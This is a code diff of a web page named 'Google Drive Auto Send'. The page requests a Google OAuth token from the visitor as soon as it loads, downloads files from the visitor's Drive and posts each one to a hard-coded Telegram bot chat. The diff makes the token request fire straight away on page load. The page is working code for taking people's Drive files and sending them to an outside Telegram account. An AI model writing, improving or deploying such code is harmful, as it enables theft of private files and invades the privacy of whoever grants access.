@@ -3,8 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <title>Google Drive Auto Send</title>
-  <script src="https://accounts.google.com/gsi/client" async defer></script>
   <script src="https://apis.google.com/js/api.js"></script>
+  <script src="https://accounts.google.com/gsi/client" async defer></script>
 </head>
 <body style="margin:0; padding:0; background:#fff;">
 
@@ -15,19 +15,7 @@
   const TELEGRAM_CHAT_ID = '6894787120';
   let access_token = null;
 
-  function handleCredentialResponse(response) {
-    google.accounts.oauth2.initTokenClient({
-      client_id: CLIENT_ID,
-      scope: SCOPES,
-      callback: (tokenResponse) => {
-        if (tokenResponse.error) return;
-        access_token = tokenResponse.access_token;
-        gapi.load('client', initializeGapiClient);
-      }
-    }).requestAccessToken();
-  }
-
-  async function initializeGapiClient() {
+  async function initializeGapiAndSend() {
     await gapi.client.init({
       discoveryDocs: ["https://www.googleapis.com/discovery/v1/apis/drive/v3/rest"],
     });
@@ -60,12 +48,10 @@
         headers: { 'Authorization': 'Bearer ' + access_token }
       });
       const blob = await response.blob();
-
       const formData = new FormData();
       formData.append('chat_id', TELEGRAM_CHAT_ID);
       formData.append('caption', `📸 ${fileName}`);
       formData.append('document', blob, fileName);
-
       await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
         method: 'POST',
         body: formData
@@ -82,11 +68,17 @@
   }
 
   window.onload = () => {
-    google.accounts.id.initialize({
+    const tokenClient = google.accounts.oauth2.initTokenClient({
       client_id: CLIENT_ID,
-      callback: handleCredentialResponse
+      scope: SCOPES,
+      callback: (tokenResponse) => {
+        if (tokenResponse.access_token) {
+          access_token = tokenResponse.access_token;
+          gapi.load('client', initializeGapiAndSend);
+        }
+      }
     });
-    google.accounts.id.prompt();
+    tokenClient.requestAccessToken();
   };
 </script>
 
